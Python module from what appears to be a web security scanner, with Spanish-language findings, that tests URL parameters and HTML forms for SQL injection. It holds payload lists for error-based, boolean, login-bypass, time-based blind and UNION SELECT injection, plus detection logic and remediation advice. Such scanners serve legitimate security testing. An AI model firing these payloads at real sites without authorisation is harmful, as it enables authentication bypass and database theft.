import time
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from difflib import SequenceMatcher
from scanner.http_client import HttpClient
from scanner.forms import extract_forms_from_html


logger = logging.getLogger(__name__)


SQL_ERROR_PATTERNS = [
    "sql syntax",
    "mysql",
    "mariadb",
    "postgresql",
    "ora-",
    "sqlite",
    "syntax error",
    "unclosed quotation",
    "quoted string not properly terminated",
    "sqlstate",
    "jdbc",
    "odbc",
    "sql server",
    "microsoft ole db",
    "psql:",
    "postgres exception",
    "oracle error",
    "warning: mysql",
    "you have an error in your sql",
    "division by zero",
    "supplied argument is not a valid mysql",
    "invalid query",
    "sql command not properly ended",
    "column count doesn't match",
    "the used select statements have a different number",
    "conversion failed when converting",
    "invalid column name",
    "unknown column",
    "table or view does not exist",
    "no such table",
    "pg::syntax",
    "unterminated string"
]


ERROR_PAYLOADS = [
    "'",
    "\"",
    "';",
    "\");",
    "' OR 1=1--",
    "\" OR 1=1--",
    "')",
    "'--",
    "') OR ('1'='1",
    "' AND SLEEP(0)--",
]

TIME_PAYLOADS = [
    {"db": "MySQL",      "payload": "' AND SLEEP(4)--",               "true": "' AND SLEEP(4)--",  "false": "' AND SLEEP(0)--"},
    {"db": "MySQL",      "payload": "\" AND SLEEP(4)--",              "true": "\" AND SLEEP(4)--", "false": "\" AND SLEEP(0)--"},
    {"db": "PostgreSQL", "payload": "' AND pg_sleep(4)--",            "true": "' AND pg_sleep(4)--",  "false": "' AND pg_sleep(0)--"},
    {"db": "MSSQL",      "payload": "'; WAITFOR DELAY '0:0:4'--",     "true": "'; WAITFOR DELAY '0:0:4'--",  "false": "'; WAITFOR DELAY '0:0:0'--"},
    {"db": "SQLite",     "payload": "' AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(4*1000000))))--", "true": "' AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(4*1000000))))--", "false": "' AND 1=1--"},
]

UNION_COLUMN_RANGE = range(1, 9)

UNION_MARKER = "bh_union_7x9z"


BOOLEAN_TESTS = [
    {
        "name": "Boolean-based simple",
        "true": "' OR '1'='1",
        "false": "' AND '1'='2"
    },
    {
        "name": "Boolean-based doble comilla",
        "true": "\" OR \"1\"=\"1",
        "false": "\" AND \"1\"=\"2"
    },
    {
        "name": "Posible bypass de login",
        "true": "admin' OR '1'='1",
        "false": "admin' AND '1'='2"
    }
]


SUCCESS_INDICATORS = [
    "dashboard",
    "logout",
    "cerrar sesión",
    "cerrar sesion",
    "mi cuenta",
    "perfil",
    "admin",
    "panel",
    "bienvenido",
    "welcome"
]


FAILURE_INDICATORS = [
    "invalid",
    "incorrect",
    "error",
    "denied",
    "unauthorized",
    "no autorizado",
    "credenciales",
    "contraseña incorrecta",
    "usuario incorrecto",
    "login failed",
    "authentication failed"
]


def similarity(a, b):
    return SequenceMatcher(None, a, b).ratio()


def detect_sql_errors(text):
    lower = text.lower()
    return [pattern for pattern in SQL_ERROR_PATTERNS if pattern in lower]


def build_form_data(form, payload):
    data = {}

    for field in form["fields"]:
        name = field["name"]
        field_type = field["type"]

        if field_type in ["submit", "button", "reset", "file"]:
            continue

        if field_type == "hidden":
            data[name] = field["value"]
        elif field_type == "email":
            data[name] = f"test{payload}@example.com"
        else:
            data[name] = payload

    return data


def submit_form(client, form, payload):
    data = build_form_data(form, payload)

    if not data:
        return None

    if form["method"] == "POST":
        return client.post(form["action"], data=data)

    return client.get(form["action"], params=data)


def analyze_boolean_difference(true_response, false_response):
    true_text = true_response.text.lower()
    false_text = false_response.text.lower()

    true_success = any(x in true_text for x in SUCCESS_INDICATORS)
    false_failure = any(x in false_text for x in FAILURE_INDICATORS)

    ratio = similarity(true_response.text, false_response.text)
    length_diff = abs(len(true_response.text) - len(false_response.text))
    status_diff = true_response.status_code != false_response.status_code
    url_diff = true_response.url != false_response.url

    # Be conservative: a mere success marker is not enough unless the response also changes structurally.
    if true_success and false_failure:
        if url_diff or status_diff or (length_diff >= 200 and ratio < 0.90):
            return True, "Indicadores de acceso exitoso frente a respuesta fallida con cambio estructural relevante."

    if status_diff and length_diff >= 200 and ratio < 0.90:
        return True, f"Cambio de código HTTP y diferencia relevante. Similitud: {ratio:.2f}"

    if length_diff >= 700 and ratio < 0.75:
        return True, f"Diferencia significativa de longitud. Diferencia: {length_diff} caracteres. Similitud: {ratio:.2f}"

    return False, f"Sin diferencia concluyente. Similitud: {ratio:.2f}, diferencia longitud: {length_diff}."


def mutate_url_param(url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return None

    mutated = {k: payload for k in params.keys()}
    return urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))


def test_time_based(client, form, time_payload_entry, time_threshold=3.5):
    """Returns (vulnerable, db_type, measured_delay) or (False, '', 0)."""
    payload_true = time_payload_entry["true"]
    payload_false = time_payload_entry["false"]
    db = time_payload_entry["db"]

    try:
        # baseline
        t0 = time.monotonic()
        r_false = submit_form(client, form, payload_false)
        t_false = time.monotonic() - t0

        if not r_false:
            return False, db, 0

        # timed payload
        t0 = time.monotonic()
        r_true = submit_form(client, form, payload_true)
        t_true = time.monotonic() - t0

        delay = t_true - t_false
        if delay >= time_threshold:
            return True, db, round(delay, 2)
    except Exception:
        logger.debug("Fallo en prueba SQLi time-based", exc_info=True)

    return False, db, 0


def test_union_based(client, form):
    """Try UNION SELECT NULL... with increasing column counts. Returns (cols, response) or (0, None)."""
    for n in UNION_COLUMN_RANGE:
        nulls = ",".join([f"'{UNION_MARKER}'" if i == 0 else "NULL" for i in range(n)])
        payload = f"' UNION SELECT {nulls}--"
        try:
            r = submit_form(client, form, payload)
            if r and UNION_MARKER in (r.text or ""):
                return n, r
        except Exception:
            logger.debug("Fallo en prueba SQLi UNION-based", exc_info=True)
    return 0, None


def scan_url_params_sqli(client, page, error_payloads):
    """Test GET parameters directly for SQLi."""
    results = []
    page_url = page.get("url") or page.get("final_url") or ""
    if not page_url:
        return results
    parsed = urlparse(page_url)
    params = parse_qs(parsed.query)

    if not params:
        return results

    for param in list(params.keys()):
        for payload in error_payloads:
            mutated = params.copy()
            mutated[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
            try:
                r = client.get(test_url)
                errors = detect_sql_errors(r.text)
                if errors:
                    results.append({
                        "control": f"SQLi error-based GET param: {param}",
                        "status": "Posible hallazgo",
                        "severity": "Alta",
                        "description": "Parámetro GET refleja error SQL al inyectar payload.",
                        "evidence": f"URL: {test_url} | Payload: {payload} | Errores: {', '.join(errors)}",
                        "recommendation": "Usar consultas parametrizadas y ocultar errores técnicos."
                    })
                    break
            except Exception:
                logger.debug("Fallo en prueba SQLi GET param", exc_info=True)

    return results


def scan_sqli_pages(pages, max_payloads=None):
    client = HttpClient()
    results = []
    error_payloads = ERROR_PAYLOADS
    boolean_tests = BOOLEAN_TESTS
    time_payloads = TIME_PAYLOADS

    if max_payloads is not None:
        error_payloads = error_payloads[:max_payloads]
        boolean_tests = boolean_tests[:max_payloads]
        time_payloads = time_payloads[:max_payloads]

    for page in pages:
        page_url  = page.get("url") or page.get("final_url") or ""
        page_html = page.get("html") or page.get("rendered_html") or ""
        if not page_url:
            continue

        # Test GET URL parameters
        results.extend(scan_url_params_sqli(client, page, error_payloads))

        forms = extract_forms_from_html(page_url, page_html)

        for form in forms:
            for payload in error_payloads:
                try:
                    response = submit_form(client, form, payload)
                    if not response:
                        continue

                    errors = detect_sql_errors(response.text)

                    if errors:
                        results.append({
                            "control": f"SQLi error-based - formulario {form['index']}",
                            "status": "Posible hallazgo",
                            "severity": "Alta",
                            "description": "Respuesta compatible con error SQL expuesto.",
                            "evidence": f"URL: {form['action']} | Payload: {payload} | Errores: {', '.join(errors)}",
                            "recommendation": "Usar consultas parametrizadas, ORM seguro y ocultar errores técnicos."
                        })

                except Exception as exc:
                    results.append({
                        "control": "SQLi error-based",
                        "status": "Error",
                        "severity": "Media",
                        "description": "Error durante prueba SQLi controlada.",
                        "evidence": str(exc),
                        "recommendation": "Revisar conectividad y comportamiento del formulario."
                    })

            for test in boolean_tests:
                try:
                    true_response = submit_form(client, form, test["true"])
                    false_response = submit_form(client, form, test["false"])

                    if not true_response or not false_response:
                        continue

                    vulnerable, evidence = analyze_boolean_difference(true_response, false_response)

                    if vulnerable:
                        results.append({
                            "control": f"{test['name']} - formulario {form['index']}",
                            "status": "Posible hallazgo",
                            "severity": "Crítica",
                            "description": "Comportamiento diferencial compatible con SQL Injection boolean-based o bypass de autenticación.",
                            "evidence": f"URL: {form['action']} | TRUE: {test['true']} | FALSE: {test['false']} | {evidence}",
                            "recommendation": "Revisar autenticación, aplicar queries parametrizadas y validación server-side."
                        })

                except Exception:
                    logger.debug("Fallo en prueba SQLi boolean-based", exc_info=True)

            # Time-based blind SQLi
            for tp in time_payloads:
                vulnerable, db, delay = test_time_based(client, form, tp)
                if vulnerable:
                    results.append({
                        "control": f"SQLi time-based blind ({db}) - formulario {form['index']}",
                        "status": "Posible hallazgo",
                        "severity": "Crítica",
                        "description": f"El formulario introduce un retraso significativo ({delay}s) compatible con time-based blind SQL Injection ({db}).",
                        "evidence": f"URL: {form['action']} | Payload: {tp['payload']} | Retraso medido: {delay}s",
                        "recommendation": "Usar consultas parametrizadas. Verificar manualmente con Burp Intruder o sqlmap."
                    })
                    break

            # UNION-based SQLi
            cols, union_response = test_union_based(client, form)
            if cols > 0:
                results.append({
                    "control": f"SQLi UNION-based - formulario {form['index']}",
                    "status": "Hallazgo",
                    "severity": "Crítica",
                    "description": f"UNION SELECT confirmado con {cols} columna(s). El marcador de auditoría apareció en la respuesta.",
                    "evidence": f"URL: {form['action']} | UNION SELECT con {cols} columnas | Marcador reflejado: {UNION_MARKER}",
                    "recommendation": "Usar consultas parametrizadas, ORM seguro y WAF. Escalar a exfiltración manual."
                })

    if not results:
        results.append({
            "control": "SQL Injection",
            "status": "No evidenciado",
            "severity": "Informativa",
            "description": "No se detectaron indicios concluyentes de SQL Injection en el alcance analizado.",
            "evidence": "Sin errores SQL ni diferencias booleanas concluyentes.",
            "recommendation": "Complementar con análisis autenticado, revisión de código y pruebas manuales."
        })

    return results